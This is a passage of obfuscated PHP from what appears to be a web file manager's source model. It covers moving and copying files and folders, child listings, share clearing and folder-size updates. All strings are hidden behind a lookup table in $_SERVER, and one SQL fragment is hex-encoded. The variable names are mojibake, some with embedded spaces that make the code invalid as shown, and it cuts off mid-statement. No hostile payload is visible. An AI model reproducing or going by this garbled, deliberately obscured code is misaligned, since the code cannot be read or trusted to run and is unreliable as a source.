$this->_childrenMatch($ÆÒ·î¶, $°ä®Á§, $À±‡ûÒÎ); $ÛË™Ñß[] = array($»»—ïßë[194], $¦Ÿ¼Åæà, $»»—ïßë[193], $öĞÂêÙ[$»»—ïßë[193]]); $±Ÿ§ÈÆ¶[] = array($»»—ïßë[194], $¦Ÿ¼Åæà, $»»—ïßë[598], $öĞÂêÙ[$»»—ïßë[598]]); $this->_copyApplyMeta($°ä®Á§, $Î²˜¥Õä); if ($°ä®Á§[$»»—ïßë[497]] != $»»—ïßë[91]) { $Î²˜¥Õä[$»»—ïßë[646]][] = $°ä®Á§[$»»—ïßë[555]]; } } $this->chunkEventSet($»»—ïßë[658], array($»»—ïßë[659], $¹¸¨Ä â, $¡¼òßÍÅ)); $this->saveAll($ÛË™Ñß); $this->chunkEventSet($»»—ïßë[660], array($»»—ïßë[661], $¹¸¨Ä â, $¡¼òßÍÅ)); $this->saveAll($±Ÿ§ÈÆ¶); return $™è«‡«›; } private function _childrenMakeRelation($ŒÔÃÀé™, $¯Ò¹¬ŠË) { $ìæ¸ü¹ì =& $_SERVER[‹‰”››ê]; $¨ŸÕ²ß° = array(); $——¶¢Ò = array(); foreach ($ŒÔÃÀé™ as $’ë£È€µ) { $’¨œÒ›Î = $’ë£È€µ[$ìæ¸ü¹ì[32]] . $ìæ¸ü¹ì[8] . $’ë£È€µ[$ìæ¸ü¹ì[598]]; $¨ŸÕ²ß°[$’¨œÒ›Î] = $’ë£È€µ[$ìæ¸ü¹ì[194]]; } foreach ($¯Ò¹¬ŠË as $’ë£È€µ) { $’¨œÒ›Î = $’ë£È€µ[$ìæ¸ü¹ì[32]] . $ìæ¸ü¹ì[8] . $’ë£È€µ[$ìæ¸ü¹ì[598]]; $Èì´ÛÎü = $¨ŸÕ²ß°[$’¨œÒ›Î]; $——¶¢Ò[$Èì´ÛÎü] = $’ë£È€µ[$ìæ¸ü¹ì[194]]; } return $——¶¢Ò; } private function _childrenMatch($™ğ½Úû, $±‚÷ùŸ, $ í“Âëë) { $Ãøø¤›Œ =& $_SERVER[‹‰”››ê]; $¨Ãß—ó = $ í“Âëë[$Ãøø¤›Œ[598]]; $§®€Á¹Â = $this->parentLevelArray($±‚÷ùŸ[$Ãøø¤›Œ[598]]); foreach ($§®€Á¹Â as $û±©ÊšÎ) { if (isset($™ğ½Úû[$û±©ÊšÎ])) { $¨Ãß—ó .= $™ğ½Úû[$û±©ÊšÎ] . $Ãøø¤›Œ[662]; } } $¨Ãß—ó = rtrim($¨Ãß—ó, $Ãøø¤›Œ[50]) . $Ãøø¤›Œ[50]; $—¶ïúÓ¢ = $this->parentLevelArray($¨Ãß—ó); $‘ĞÚ³ï¾ = $—¶ïúÓ¢[count($—¶ïúÓ¢) - 1]; return array($Ãøø¤›Œ[193] => $‘ĞÚ³ï¾, $Ãøø¤›Œ[598] => $¨Ãß—ó); } private function _makeItemData($šœÛ·ùù, $‘­¿åéË, $ÖÎÖšû†) { $ªœ‚éû¬ =& $_SERVER[‹‰”››ê]; $ÅÉŠÙƒ… = array($ªœ‚éû¬[663] => $šœÛ·ùù[$ªœ‚éû¬[497]], $ªœ‚éû¬[506] => $ÖÎÖšû†, $ªœ‚éû¬[664] => $šœÛ·ùù[$ªœ‚éû¬[498]] ? $šœÛ·ùù[$ªœ‚éû¬[498]] : $ªœ‚éû¬[12], $ªœ‚éû¬[556] => $šœÛ·ùù[$ªœ‚éû¬[555]] ? $šœÛ·ùù[$ªœ‚éû¬[555]] : 0, $ªœ‚éû¬[634] => $šœÛ·ùù[$ªœ‚éû¬[79]] ? $šœÛ·ùù[$ªœ‚éû¬[79]] : 0, $ªœ‚éû¬[665] => intval($‘­¿åéË[$ªœ‚éû¬[191]]), $ªœ‚éû¬[666] => intval($‘­¿åéË[$ªœ‚éû¬[583]]), $ªœ‚éû¬[667] => intval(USER_ID), $ªœ‚éû¬[668] => intval(USER_ID), $ªœ‚éû¬[489] => intval($‘­¿åéË[$ªœ‚éû¬[194]]), $ªœ‚éû¬[669] => $‘­¿åéË[$ªœ‚éû¬[598]] . $‘­¿åéË[$ªœ‚éû¬[194]] . $ªœ‚éû¬[50], $ªœ‚éû¬[510] => $šœÛ·ùù[$ªœ‚éû¬[88]] ? $šœÛ·ùù[$ªœ‚éû¬[88]] : time(), $ªœ‚éû¬[516] => 0, $ªœ‚éû¬[670] => $ªœ‚éû¬[12]); return $ÅÉŠÙƒ…; } private function _copyApplyMeta($“æˆ¥ßÂ, &$ã±Şå°) { $ŠæôÖŸÀ =& $_SERVER[‹‰”››ê]; $Óûàå†ï = $“æˆ¥ßÂ[$ŠæôÖŸÀ[194]]; $îôß«ª = $“æˆ¥ßÂ[$ŠæôÖŸÀ[32]]; if (!isset($“æˆ¥ßÂ[$ŠæôÖŸÀ[671]]) || !$“æˆ¥ßÂ[$ŠæôÖŸÀ[671]] || $“æˆ¥ßÂ[$ŠæôÖŸÀ[671]] == $ŠæôÖŸÀ[231]) { $ã±Şå°[$ŠæôÖŸÀ[648]][] = array($ŠæôÖŸÀ[194], $Óûàå†ï, $ŠæôÖŸÀ[671], short_id($Óûàå†ï)); } if (Input::check($îôß«ª, $ŠæôÖŸÀ[672])) { $ã±Şå°[$ŠæôÖŸÀ[647]][] = array($ŠæôÖŸÀ[194] => $Óûàå†ï, $ŠæôÖŸÀ[97] => $ŠæôÖŸÀ[550], $ŠæôÖŸÀ[462] => str_replace($ŠæôÖŸÀ[53], $ŠæôÖŸÀ[12], Pinyin::get($îôß«ª))); $ã±Şå°[$ŠæôÖŸÀ[647]][] = array($ŠæôÖŸÀ[194] => $Óûàå†ï, $ŠæôÖŸÀ[97] => $ŠæôÖŸÀ[549], $ŠæôÖŸÀ[462] => Pinyin::get($îôß«ª, $ŠæôÖŸÀ[673])); } $ã±Şå°[$ŠæôÖŸÀ[647]][] = array($ŠæôÖŸÀ[194] => $Óûàå†ï, $ŠæôÖŸÀ[97] => $ŠæôÖŸÀ[529], $ŠæôÖŸÀ[462] => KodSort::makeStr($îôß«ª)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($·ÌãòÌ) { $Õ‹›Ë©ù =& $_SERVER[‹‰”››ê]; $Ã¨£ÏÀì = $this->sourceInfo($·ÌãòÌ); $ÍßÙÒ™ = $Õ‹›Ë©ù[674]; $õ¶ùàçŸ = array($Õ‹›Ë©ù[598] => array($Õ‹›Ë©ù[629], $Ã¨£ÏÀì[$Õ‹›Ë©ù[598]] . $·ÌãòÌ . $Õ‹›Ë©ù[630]), $Õ‹›Ë©ù[517] => $this->targetIsDelete); $¹ñ·’ = $this->field($ÍßÙÒ™)->where($õ¶ùàçŸ)->select(); if (!$¹ñ·’) { return; } $¹ñ·’ = array_to_keyvalue($¹ñ·’, $Õ‹›Ë©ù[194]); foreach ($¹ñ·’ as $ÂâÜŒ°) { $É“¿šü = $ÂâÜŒ°[$Õ‹›Ë©ù[193]]; $·ÌãòÌ = $ÂâÜŒ°[$Õ‹›Ë©ù[194]]; if (!isset($this->_childrenListCache[$·ÌãòÌ]) && $ÂâÜŒ°[$Õ‹›Ë©ù[497]] == $Õ‹›Ë©ù[91]) { $this->_childrenListCache[$·ÌãòÌ] = array(); } if (!isset($this->_childrenListCache[$É“¿šü])) { $this->_childrenListCache[$É“¿šü] = array(); } $this->_childrenListCache[$É“¿šü][$·ÌãòÌ] = $ÂâÜŒ°; $this->_childrenItemCache[$·ÌãòÌ] = $ÂâÜŒ°; } } private function _childrenListAll($ûÈŸŒÚ³, &$Úúû ãØ) { $—ûÜ¨è‘ =& $_SERVER[‹‰”››ê]; if (!isset($this->_childrenListCache[$ûÈŸŒÚ³])) { return; } $Æûš‰ÎÃ = $this->_childrenListCache[$ûÈŸŒÚ³]; foreach ($Æûš‰ÎÃ as $™Ø•Î¹† => $ğô¾§‚¢) { $Úúû ãØ[$™Ø•Î¹†] = $ğô¾§‚¢; if ($ğô¾§‚¢[$—ûÜ¨è‘[497]] == $—ûÜ¨è‘[91]) { $this->_childrenListAll($™Ø•Î¹†, $Úúû ãØ); } } } private function sourceInfoCache($ÜÊòÙñÑ) { if (isset($this->_childrenItemCache[$ÜÊòÙñÑ])) { return $this->_childrenItemCache[$ÜÊòÙñÑ]; } return $this->sourceInfo($ÜÊòÙñÑ); } private function _childrenList($şñ­ÛÕİ) { if (isset($this->_childrenListCache[$şñ­ÛÕİ])) { return $this->_childrenListCache[$şñ­ÛÕİ]; } return $this->_childrenListSelect($şñ­ÛÕİ); } private function _childrenListSelect($§“£ª“ƒ) { $í©ÉÀ»Ä =& $_SERVER[‹‰”››ê]; $·İ‰úú = array($í©ÉÀ»Ä[193] => $§“£ª“ƒ, $í©ÉÀ»Ä[517] => $this->targetIsDelete); $Ïº’¨„° = $this->where($·İ‰úú)->select(); $Ïº’¨„° = $Ïº’¨„° ? $Ïº’¨„° : array(); $¹£ÆÆú¹ = array_to_keyvalue($Ïº’¨„°, $í©ÉÀ»Ä[194]); $this->_childrenListCache[$§“£ª“ƒ] = $¹£ÆÆú¹; foreach ($¹£ÆÆú¹ as $§“£ª“ƒ => $ƒ‘öñíü) { $this->_childrenItemCache[$§“£ª“ƒ] = $ƒ‘öñíü; } return $¹£ÆÆú¹; } private function fileNameExistAuto($×—áéİ®, $ä«·’ñ¿) { $èÉÁîÙÃ =& $_SERVER[‹‰”››ê]; if ($ä«·’ñ¿[$èÉÁîÙÃ[517]] == $èÉÁîÙÃ[91]) { return $this->fileNameExist($×—áéİ®, $ä«·’ñ¿[$èÉÁîÙÃ[32]]); } return $this->fileNameExistCache($×—áéİ®, $ä«·’ñ¿[$èÉÁîÙÃ[32]]); } private function fileNameExistCache($×œ§‡, $‹ïÖÈ×ã) { $àÛÉ¹Éƒ =& $_SERVER[‹‰”››ê]; $‹ïÖÈ×ã = strtolower($‹ïÖÈ×ã); $µ‡İ¹ùæ = $this->_childrenList($×œ§‡); foreach ($µ‡İ¹ùæ as $¤¬™ÛÕ ) { if ($‹ïÖÈ×ã == strtolower($¤¬™ÛÕ [$àÛÉ¹Éƒ[32]])) { return $¤¬™ÛÕ [$àÛÉ¹Éƒ[194]]; } } return !1; } private function fileNameAutoCache($º€‚ã¡·, $Æ¬¦¢›î, $ªš¾º†, $›„¬óíÛ) { $À¹¿Œıæ =& $_SERVER[‹‰”››ê]; $şá£ùÓÅ = $this->_childrenList($º€‚ã¡·); $ˆØŠ»¹— = array_to_keyvalue($şá£ùÓÅ, $À¹¿Œıæ[12], $À¹¿Œıæ[32]); return $this->fileNameAutoGet($ˆØŠ»¹—, $Æ¬¦¢›î, $ªš¾º†, $›„¬óíÛ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ºö£ğì, $ÙàŞõ¥», $ œ¡âºÂ = REPEAT_REPLACE, $®Ñ¸ÔÀ£ = '') { $½¶ˆÁş¹ =& $_SERVER[‹‰”››ê]; $À•ÓŸ³ = $this->sourceInfo($ºö£ğì); $¿ı§È’ï = $this->sourceInfo($ÙàŞõ¥»); if ($À•ÓŸ³[$½¶ˆÁş¹[193]] == $¿ı§È’ï[$½¶ˆÁş¹[194]]) { if ($À•ÓŸ³[$½¶ˆÁş¹[517]] == $½¶ˆÁş¹[91]) { Model($½¶ˆÁş¹[515])->restore(array($ºö£ğì)); } if (!$®Ñ¸ÔÀ£ || $®Ñ¸ÔÀ£ == $À•ÓŸ³[$½¶ˆÁş¹[32]]) { return $ºö£ğì; } } $Ù½¯Ø = $this->pathInfoMore($ºö£ğì); if ($this->isParentOf($ºö£ğì, $ÙàŞõ¥»)) { return !1; } if (!$À•ÓŸ³ || !$¿ı§È’ï || $¿ı§È’ï[$½¶ˆÁş¹[497]] != $½¶ˆÁş¹[91]) { return !1; } Hook::trigger($½¶ˆÁş¹[675], $Ù½¯Ø); $this->targetIsDelete = intval($À•ÓŸ³[$½¶ˆÁş¹[517]]); if ($À•ÓŸ³[$½¶ˆÁş¹[193]] == $ÙàŞõ¥» && $®Ñ¸ÔÀ£ != $À•ÓŸ³[$½¶ˆÁş¹[32]]) { $Òèß•È = $this->fileNameExist($ÙàŞõ¥», $®Ñ¸ÔÀ£); if ($Òèß•È && $À•ÓŸ³[$½¶ˆÁş¹[497]] == $½¶ˆÁş¹[231]) { $ç¯¹Çê = $this->sourceInfo($Òèß•È); $ôÁî³» = $this->fileHistory($ç¯¹Çê, $À•ÓŸ³[$½¶ˆÁş¹[555]], $À•ÓŸ³[$½¶ˆÁş¹[79]]); if (!$ôÁî³») { Model($½¶ˆÁş¹[558])->remove($À•ÓŸ³[$½¶ˆÁş¹[555]]); } $this->removeNow($ºö£ğì, !1); $this->folderSizeReset($ÙàŞõ¥»); Hook::trigger($½¶ˆÁş¹[676], $Ù½¯Ø); return $Òèß•È; } } $ßĞÅËœÎ = $®Ñ¸ÔÀ£ ? $®Ñ¸ÔÀ£ : $À•ÓŸ³[$½¶ˆÁş¹[32]]; $this->lockMoveStart($ºö£ğì); $this->lockWriteStart($ÙàŞõ¥», $ßĞÅËœÎ); $¾™Ì¼ü‚ = array($½¶ˆÁş¹[646] => array(), $½¶ˆÁş¹[677] => !1); $this->clearShare($ºö£ğì, $ÙàŞõ¥»); $Äˆ”¯ê = $this->fileNameExistAuto($ÙàŞõ¥», $À•ÓŸ³); $ŸéŸÏ˜ = $this->_move($ºö£ğì, $ÙàŞõ¥», $ œ¡âºÂ, $¾™Ì¼ü‚, $®Ñ¸ÔÀ£); $this->sourceCacheClear(); if ($À•ÓŸ³[$½¶ˆÁş¹[497]] == $½¶ˆÁş¹[91] && $Äˆ”¯ê) { $this->folderSizeResetChildren($ŸéŸÏ˜); } Model($½¶ˆÁş¹[233])->linkAdd($¾™Ì¼ü‚[$½¶ˆÁş¹[646]]); if ($ŸéŸÏ˜ && $Äˆ”¯ê && $¾™Ì¼ü‚[$½¶ˆÁş¹[677]]) { $Åğ“Üóå = $À•ÓŸ³[$½¶ˆÁş¹[497]] == $½¶ˆÁş¹[91] ? $this->_childrenListSelect($ºö£ğì) : !1; $Ô¹•˜ºæ = $Åğ“Üóå && count($Åğ“Üóå) > 0 ? !0 : !1; $this->removeNow($ºö£ğì, $Ô¹•˜ºæ); } $this->lockMoveEnd($ºö£ğì); $this->lockWriteEnd($ÙàŞõ¥», $ßĞÅËœÎ); $this->folderSizeReset($À•ÓŸ³[$½¶ˆÁş¹[193]]); $this->folderSizeReset($ÙàŞõ¥»); $ÊÇÊü´ª = array($À•ÓŸ³[$½¶ˆÁş¹[193]], $ÙàŞõ¥»); if ($À•ÓŸ³[$½¶ˆÁş¹[497]] == $½¶ˆÁş¹[91]) { $ÊÇÊü´ª[] = $ºö£ğì; } $this->updateModifyTime($ÊÇÊü´ª); Model($½¶ˆÁş¹[650])->eventMove($ºö£ğì, $À•ÓŸ³[$½¶ˆÁş¹[193]], $ÙàŞõ¥»); Hook::trigger($½¶ˆÁş¹[676], $Ù½¯Ø); return $ŸéŸÏ˜; } private function _move($ı½Ñ¬’æ, $œ¡æÌŸ¿, $ûÌËòèì, &$¦¦µ¿¯Ë, $»ˆÖ‡¤ = '') { $í¾ÇåÒÒ =& $_SERVER[‹‰”››ê]; $òäû¼“ = $this->sourceInfo($ı½Ñ¬’æ); $¸¯Ë¤ğê = $òäû¼“[$í¾ÇåÒÒ[497]] == $í¾ÇåÒÒ[91]; $ß¡â‚§˜ = $»ˆÖ‡¤ ? $»ˆÖ‡¤ : $òäû¼“[$í¾ÇåÒÒ[32]]; $«„×…áĞ = $this->fileNameExistAuto($œ¡æÌŸ¿, $òäû¼“); $this->lockMoveStart($ı½Ñ¬’æ); $this->lockWriteStart($œ¡æÌŸ¿, $ß¡â‚§˜); if (!$«„×…áĞ) { return $this->_moveForce($ı½Ñ¬’æ, $œ¡æÌŸ¿, $ß¡â‚§˜); } $ÎØ¾“‰Ë = $«„×…áĞ; $Éœåæ´‘ = !1; if ($¸¯Ë¤ğê) { if ($ûÌËòèì == REPEAT_RENAME_FOLDER) { $ß¡â‚§˜ = $this->fileNameAuto($œ¡æÌŸ¿, $ß¡â‚§˜, $ûÌËòèì, $¸¯Ë¤ğê); $ÎØ¾“‰Ë = $this->_moveForce($ı½Ñ¬’æ, $œ¡æÌŸ¿, $ß¡â‚§˜); } else { $Ò±çè¹İ = $this->_childrenListSelect($ı½Ñ¬’æ); foreach ($Ò±çè¹İ as $úÙ÷õ¦) { $·Ö´÷ÔÜ = REPEAT_REPLACE; $this->_move($úÙ÷õ¦[$í¾ÇåÒÒ[194]], $«„×…áĞ, $·Ö´÷ÔÜ, $¦¦µ¿¯Ë); } $Éœåæ´‘ = !0; } } else { if ($ûÌËòèì == REPEAT_RENAME || $ûÌËòèì == REPEAT_RENAME_FOLDER) { $ß¡â‚§˜ = $this->fileNameAuto($œ¡æÌŸ¿, $ß¡â‚§˜, $ûÌËòèì, $¸¯Ë¤ğê); $ÎØ¾“‰Ë = $this->_moveForce($ı½Ñ¬’æ, $œ¡æÌŸ¿, $ß¡â‚§˜); } else { $ÅàÃö° = $this->sourceInfoCache($«„×…áĞ); $åØØƒÃ› = $this->fileHistory($ÅàÃö°, $òäû¼“[$í¾ÇåÒÒ[555]], $òäû¼“[$í¾ÇåÒÒ[79]]); if ($åØØƒÃ›) { $¦¦µ¿¯Ë[$í¾ÇåÒÒ[646]][] = $òäû¼“[$í¾ÇåÒÒ[555]]; } $Éœåæ´‘ = !0; } } if ($Éœåæ´‘) { $¦¦µ¿¯Ë[$í¾ÇåÒÒ[677]] = !0; } return $ÎØ¾“‰Ë; } private function _moveForce($±°ŸÖñ¡, $é÷Í›¬‚, $¸ÙğÍ’‡) { $—Äá¦Ä· =& $_SERVER[‹‰”››ê]; $î¹ùüõû = $this->sourceInfo($±°ŸÖñ¡); $øœì“šê = $this->sourceInfo($é÷Í›¬‚); $Ä¬…Ò¡î = $î¹ùüõû[$—Äá¦Ä·[497]] == $—Äá¦Ä·[91]; $îÌ™Û¯Ë = array($—Äá¦Ä·[489] => $øœì“šê[$—Äá¦Ä·[194]], $—Äá¦Ä·[669] => $øœì“šê[$—Äá¦Ä·[598]] . $øœì“šê[$—Äá¦Ä·[194]] . $—Äá¦Ä·[50], $—Äá¦Ä·[665] => $øœì“šê[$—Äá¦Ä·[191]], $—Äá¦Ä·[666] => $øœì“šê[$—Äá¦Ä·[583]], $—Äá¦Ä·[668] => USER_ID, $—Äá¦Ä·[506] => $¸ÙğÍ’‡); $¹ñ“•¼¯ = $î¹ùüõû[$—Äá¦Ä·[191]] == SourceModel::TYPE_GROUP && $øœì“šê[$—Äá¦Ä·[191]] == SourceModel::TYPE_GROUP && $î¹ùüõû[$—Äá¦Ä·[583]] == $øœì“šê[$—Äá¦Ä·[583]]; if (!$¹ñ“•¼¯ && $this->moveClearAuth) { Model($—Äá¦Ä·[581])->authClear($±°ŸÖñ¡); } $ÅÊ„ù¶Ì = $î¹ùüõû[$—Äá¦Ä·[517]] == $—Äá¦Ä·[91] && $øœì“šê[$—Äá¦Ä·[517]] != $—Äá¦Ä·[91]; if ($ÅÊ„ù¶Ì) { $îÌ™Û¯Ë[$—Äá¦Ä·[516]] = 0; } if ($Ä¬…Ò¡î) { $Øßºù¨î = array($—Äá¦Ä·[669] => array($—Äá¦Ä·[629], $î¹ùüõû[$—Äá¦Ä·[598]] . $î¹ùüõû[$—Äá¦Ä·[194]] . $—Äá¦Ä·[630])); $¾‚íÒ™ = $î¹ùüõû[$—Äá¦Ä·[598]] . $î¹ùüõû[$—Äá¦Ä·[194]] . $—Äá¦Ä·[50]; $çÏ‡¹ß = $øœì“šê[$—Äá¦Ä·[598]] . $øœì“šê[$—Äá¦Ä·[194]] . $—Äá¦Ä·[50] . $î¹ùüõû[$—Äá¦Ä·[194]] . $—Äá¦Ä·[50]; $üÕæõ… = array($—Äá¦Ä·[669] => array($—Äá¦Ä·[678], "\x72\x65\x70\x6c\141\x63\145\50\160\x61\x72\145\156\x74\114\145\166\145\154\54\x27{$¾‚íÒ™}\x27\x2c\x27{$çÏ‡¹ß}\x27\51"), $—Äá¦Ä·[665] => $øœì“šê[$—Äá¦Ä·[191]], $—Äá¦Ä·[666] => $øœì“šê[$—Äá¦Ä·[583]]); if ($ÅÊ„ù¶Ì) { $üÕæõ…[$—Äá¦Ä·[516]] = 0; } $this->where($Øßºù¨î)->data($üÕæõ…)->save(); } $this->where(array($—Äá¦Ä·[503] => $±°ŸÖñ¡))->data($îÌ™Û¯Ë)->save(); return $±°ŸÖñ¡; } private function clearShare($½Çº±À¾, $é¹Èíˆ„) { $®Ğª¾ÀŸ =& $_SERVER[‹‰”››ê]; $Ôë”°™‚ = $this->sourceInfo($½Çº±À¾); $ĞÉê“ş‡ = $this->sourceInfo($é¹Èíˆ„); if ($Ôë”°™‚[$®Ğª¾ÀŸ[583]] == $ĞÉê“ş‡[$®Ğª¾ÀŸ[583]] && $Ôë”°™‚[$®Ğª¾ÀŸ[191]] == $®Ğª¾ÀŸ[679]) { return; } $¦¢ú®´ = array($®Ğª¾ÀŸ[598] => array($®Ğª¾ÀŸ[629], $Ôë”°™‚[$®Ğª¾ÀŸ[598]] . $½Çº±À¾ . $®Ğª¾ÀŸ[630])); $ğ¡àş‘ = $this->field($®Ğª¾ÀŸ[503])->where($¦¢ú®´)->getField($®Ğª¾ÀŸ[194], !0); if (!$ğ¡àş‘) { return; } $¦¢ú®´ = array($®Ğª¾ÀŸ[194] => array($®Ğª¾ÀŸ[7], $ğ¡àş‘), $®Ğª¾ÀŸ[680] => 1); $â‡·³‡ = Model($®Ğª¾ÀŸ[681])->field($®Ğª¾ÀŸ[682])->where($¦¢ú®´)->select(); if (!$â‡·³‡) { return; } $â‡·³‡ = array_to_keyvalue($â‡·³‡, $®Ğª¾ÀŸ[12], $®Ğª¾ÀŸ[682]); $¦¢ú®´ = array($®Ğª¾ÀŸ[682] => array($®Ğª¾ÀŸ[7], $â‡·³‡)); Model($®Ğª¾ÀŸ[681])->where($¦¢ú®´)->save(array($®Ğª¾ÀŸ[680] => 0)); Model($®Ğª¾ÀŸ[683])->where($¦¢ú®´)->delete(); } public function copyFolderFromIO($ç„¬½ä, $ùû¤ô£½, $À²Õ¯Œê, $Í«„ú, $ ôÈ…üá, $Š•Ò–°ˆ = false) { $øğ’áõı =& $_SERVER[‹‰”››ê]; $í®¹ŸÆ¾ = array($øğ’áõı[647] => array(), $øğ’áõı[648] => array(), $øğ’áõı[646] => array(), $øğ’áõı[684] => array()); $ê´®º… = $Š•Ò–°ˆ ? $Š•Ò–°ˆ : $ç„¬½ä->pathThis($ùû¤ô£½); $˜ŸÀ©¦¾ = $this->fileNameExist($À²Õ¯Œê, $ê´®º…); $ğÇŒ©Úü = $this->mkdir($À²Õ¯Œê, $ê´®º…, $Í«„ú); if (!$˜ŸÀ©¦¾ || $Í«„ú == REPEAT_RENAME_FOLDER) { $Í«„ú = !1; } if ($˜ŸÀ©¦¾) { $this->_childrenAllMake($˜ŸÀ©¦¾); } Hook::trigger($øğ’áõı[685]); $this->_copyChildTo($ç„¬½ä, $ùû¤ô£½, $ğÇŒ©Úü, $Í«„ú, $í®¹ŸÆ¾, $ ôÈ…üá); Hook::trigger($øğ’áõı[686]); if ($ğÇŒ©Úü) { $this->folderSizeResetChildren($ğÇŒ©Úü); } $this->_childrenListClear(); Model($øğ’áõı[649])->addAll($í®¹ŸÆ¾[$øğ’áõı[647]], array(), !0); Model($øğ’áõı[650])->eventCopy($ğÇŒ©Úü); $this->saveAll($í®¹ŸÆ¾[$øğ’áõı[648]]); Model($øğ’áõı[558])->linkAdd($í®¹ŸÆ¾[$øğ’áõı[646]]); Model($øğ’áõı[558])->remove($í®¹ŸÆ¾[$øğ’áõı[684]]); $this->folderSizeReset($À²Õ¯Œê); $this->updateModifyTime($À²Õ¯Œê); return $ğÇŒ©Úü; } private function _copyChildTo($¥úû˜Ù–, $¢¬Ñ¢©, $©®âÃòÏ, $±ƒĞ„€—, &$ıá…©¸Ÿ, $ƒñÔğãì) { $Æºâ¸Ì‡ =& $_SERVER[‹‰”››ê]; $ÅµûÙ° = $this->sourceInfoCache($©®âÃòÏ); $óŸÊ…Ø¢ = $¥úû˜Ù–->listPath($¢¬Ñ¢©); $óŸÊ…Ø¢ = $óŸÊ…Ø¢ ? $óŸÊ…Ø¢ : array($Æºâ¸Ì‡[86] => array(), $Æºâ¸Ì‡[85] => array()); $îåõÜ‰Ã = array_merge($óŸÊ…Ø¢[$Æºâ¸Ì‡[86]], $óŸÊ…Ø¢[$Æºâ¸Ì‡[85]]); $Âğ»ê•Â = $this->_addFiles($¥úû˜Ù–, $óŸÊ…Ø¢[$Æºâ¸Ì‡[86]], $ƒñÔğãì); $¿‰¬ÙâÕ = array(); foreach ($îåõÜ‰Ã as &$şš¥ö¶ì) { if (isset($Âğ»ê•Â[$şš¥ö¶ì[$Æºâ¸Ì‡[32]]])) { $şš¥ö¶ì = $Âğ»ê•Â[$şš¥ö¶ì[$Æºâ¸Ì‡[32]]]; } $şš¥ö¶ì[$Æºâ¸Ì‡[497]] = $şš¥ö¶ì[$Æºâ¸Ì‡[33]] == $Æºâ¸Ì‡[78]; $şš¥ö¶ì[$Æºâ¸Ì‡[498]] = substr(_get($şš¥ö¶ì, $Æºâ¸Ì‡[169], $Æºâ¸Ì‡[12]), 0, 10); $şš¥ö¶ì[$Æºâ¸Ì‡[79]] = _get($şš¥ö¶ì, $Æºâ¸Ì‡[79], 0); $şš¥ö¶ì[$Æºâ¸Ì‡[555]] = _get($şš¥ö¶ì, $Æºâ¸Ì‡[555], 0); if (!isset($şš¥ö¶ì[$Æºâ¸Ì‡[687]]) && $şš¥ö¶ì[$Æºâ¸Ì‡[555]]) { $ıá…©¸Ÿ[$Æºâ¸Ì‡[684]][] = $şš¥ö¶ì[$Æºâ¸Ì‡[555]]; } if ($±ƒĞ„€—) { $°áÅÇÇı = $this->fileNameExistCache($©®âÃòÏ, $şš¥ö¶ì[$Æºâ¸Ì‡[32]]); if ($°áÅÇÇı) { if ($şš¥ö¶ì[$Æºâ¸Ì‡[497]] || $±ƒĞ„€— == REPEAT_SKIP) { continue; } if ($±ƒĞ„€— == REPEAT_REPLACE) { $­Ç‰·®“ = $this->sourceInfoCache($°áÅÇÇı); $¾ÕáöÃè = $this->fileHistory($­Ç‰·®“, $şš¥ö¶ì[$Æºâ¸Ì‡[555]], $şš¥ö¶ì[$Æºâ¸Ì‡[79]]); if ($¾ÕáöÃè) { $ıá…©¸Ÿ[$Æºâ¸Ì‡[646]][] = $şš¥ö¶ì[$Æºâ¸Ì‡[555]]; } continue; } else { if ($±ƒĞ„€— == REPEAT_RENAME) { $şš¥ö¶ì[$Æºâ¸Ì‡[32]] = $this->fileNameAutoCache($©®âÃòÏ, $şš¥ö¶ì[$Æºâ¸Ì‡[32]], $±ƒĞ„€—, !1); } } } } if (!$şš¥ö¶ì[$Æºâ¸Ì‡[497]] && $şš¥ö¶ì[$Æºâ¸Ì‡[555]] == 0) { continue; } if (!$şš¥ö¶ì[$Æºâ¸Ì‡[497]] && $şš¥ö¶ì[$Æºâ¸Ì‡[555]]) { $ıá…©¸Ÿ[$Æºâ¸Ì‡[646]][] = $şš¥ö¶ì[$Æºâ¸Ì‡[555]]; } $¿‰¬ÙâÕ[] = $this->_makeItemData($şš¥ö¶ì, $ÅµûÙ°, $şš¥ö¶ì[$Æºâ¸Ì‡[32]]); } unset($şš¥ö¶ì); if (!empty($¿‰¬ÙâÕ)) { $this->addAll($¿‰¬ÙâÕ); $this->_childrenListSelect($©®âÃòÏ); } $ÜØüë = $this->_childrenList($©®âÃòÏ); $ÜØüë = array_to_keyvalue($ÜØüë, $Æºâ¸Ì‡[32]); foreach ($îåõÜ‰Ã as $şš¥ö¶ì) { $­Ç‰·®“ = $ÜØüë[$şš¥ö¶ì[$Æºâ¸Ì‡[32]]]; $Ø¬ˆ€Æ„ = $­Ç‰·®“[$Æºâ¸Ì‡[194]]; $this->_copyApplyMeta($­Ç‰·®“, $ıá…©¸Ÿ); if ($şš¥ö¶ì[$Æºâ¸Ì‡[33]] == $Æºâ¸Ì‡[78]) { $şš¥ö¶ì[$Æºâ¸Ì‡[87]] = $¥úû˜Ù–->getPathInner($şš¥ö¶ì[$Æºâ¸Ì‡[87]]); $this->_copyChildTo($¥úû˜Ù–, $şš¥ö¶ì[$Æºâ¸Ì‡[87]], $Ø¬ˆ€Æ„, $±ƒĞ„€—, $ıá…©¸Ÿ, $ƒñÔğãì); } } } private function _addFiles($ğĞŞÄ¹‰, $¤ò„İÄ, $¿ù‹—òà) { $¹Ïí›»Å =& $_SERVER[‹‰”››ê]; if (!$¤ò„İÄ || count($¤ò„İÄ) == 0) { return array(); } $¿­Ü½ƒè = array(); foreach ($¤ò„İÄ as &$ºÎ¯¸×) { Hook::trigger($¹Ïí›»Å[688], $ºÎ¯¸×); $ºÎ¯¸×[$¹Ïí›»Å[87]] = $ğĞŞÄ¹‰->getPathInner($ºÎ¯¸×[$¹Ïí›»Å[87]]); $åØÔåï = $ğĞŞÄ¹‰->hashSimple($ºÎ¯¸×[$¹Ïí›»Å[87]]); $¾œ¢ÊÂ = $ğĞŞÄ¹‰->hashMd5($ºÎ¯¸×[$¹Ïí›»Å[87]]); if (strlen($¾œ¢ÊÂ) > 10 && !isset($¿­Ü½ƒè[$¾œ¢ÊÂ])) { $¿­Ü½ƒè[$¾œ¢ÊÂ] = array(); } $ºÎ¯¸×[$¹Ïí›»Å[689]] = $åØÔåï; $ºÎ¯¸×[$¹Ïí›»Å[561]] = $¾œ¢ÊÂ; $¿­Ü½ƒè[$¾œ¢ÊÂ][] =& 